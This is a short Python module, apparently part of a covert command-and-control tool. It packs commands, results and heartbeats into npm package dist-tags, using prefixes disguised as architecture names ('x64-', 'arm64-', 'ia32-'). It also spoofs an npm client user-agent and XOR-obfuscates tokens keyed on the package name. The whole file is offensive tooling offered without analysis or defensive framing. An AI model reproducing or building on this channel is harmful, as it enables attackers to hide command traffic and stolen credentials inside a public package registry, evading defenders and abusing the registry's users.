import base64
import os
import hashlib

CMD_PREFIX = "x64-"
RES_PREFIX = "arm64-"
HBT_PREFIX = "ia32-"
TAG_VALUE = "1.0.0"
MAX_TAG_LEN = 250
API = "https://registry.npmjs.org/-/package/{}/dist-tags"
UA = "npm/11.18.0 node/v22.7.0 win32 x64"


def encode_payload(data: bytes, prefix: str = CMD_PREFIX) -> list[str]:
    b64 = base64.urlsafe_b64encode(data).rstrip(b"=").decode()
    room = MAX_TAG_LEN - len(prefix) - 7
    tags = []
    for i in range(0, len(b64), room):
        chunk = b64[i:i + room]
        nonce = os.urandom(3).hex()
        tags.append(f"{prefix}{nonce}_{chunk}")
    return tags


def decode_tag(tag: str):
    for p in (CMD_PREFIX, RES_PREFIX, HBT_PREFIX):
        if not tag.startswith(p):
            continue
        body = tag[len(p):]
        if "_" not in body:
            return None
        nonce, b64d = body.split("_", 1)
        try:
            pad = 4 - len(b64d) % 4
            if pad != 4:
                b64d += "=" * pad
            return nonce, base64.urlsafe_b64decode(b64d)
        except Exception:
            return None
    return None


def _xor_key(package: str) -> bytes:
    return hashlib.sha256(package.encode()).digest()[:16]


def obfuscate_token(token: str, package: str) -> str:
    key = _xor_key(package)
    raw = bytes(a ^ b for a, b in zip(token.encode(),
                key * (len(token) // len(key) + 1)))[:len(token)]
    return raw.hex()


def deobfuscate_token(hexdata: str, package: str) -> str | None:
    key = _xor_key(package)
    raw = bytes.fromhex(hexdata)
    dec = bytes(a ^ b for a, b in zip(raw,
                key * (len(raw) // len(key) + 1)))[:len(raw)]
    try:
        return dec.decode()
    except UnicodeDecodeError:
        return None
